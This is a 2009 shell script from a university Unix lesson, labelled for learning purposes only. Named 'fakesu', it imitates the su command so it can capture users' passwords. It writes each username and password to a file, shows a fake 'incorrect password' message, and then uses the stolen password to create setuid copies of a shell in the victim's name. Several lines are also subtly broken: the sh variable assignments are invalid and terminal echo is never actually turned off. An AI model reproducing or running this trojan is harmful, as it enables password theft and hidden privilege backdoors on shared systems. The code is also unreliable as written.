---
title: "nastavovani prav.txt"
source: "/mnt/f/git/mgr/FPE_navazujici/2. Semestr/SSPGM/internet/unix-lekce/skripty-zdrojaky/nastavovani prav.txt"
date: 2009-05-01
type: TXT
---

#!/bin/sh

#
# fakesu
#
# FOR LEARNING PURPOSES ONLY
# Script mimics the su command and stores the username 
# and password of the users and creates their sUid shells.
# A stupid version, at least a bit smart user will not use
# the su command to work on his account.

# Set the names of sUid shells directory and passwords files
SHELLS = /home/Petr/pokusy
PWLIST = /$SHELLS/passwords

# Expect the username as the first argument
$username = $1

# If we do not know the password for the $username yet...
if ! `grep "^$username:" $PWLIST >/dev/null` ; then

	# ... ask for the password (mimic su)
	echo -n "Password: "
	# turn the echo off and on
	stty echo
	read password
	stty echo
	echo
	# Pretend incorrect password was given
	echo "/bin/su: incorrect password"
	# but store the given password
	echo "$username:$password" >> $PWLIST

# If we already have the password but not the sUid shell...
elif [ ! -e $username ] ; then

	# Call the su command to create the sUid shell
	# su will ask for the password and then runs the given commands
	/bin/su $username -c "cp $SHELLS/shell $SHELLS/$username;
			      chmod 4755 $SHELLS/$username"
	# Again, pretend incorrect password was given
	echo "/bin/su: incorrect password"

else

	# Finally, we have the password and sUid shell
	# Run the real su
	/bin/su $username

	# After the user finished his work, kill the process
	kill $PPID $$

fi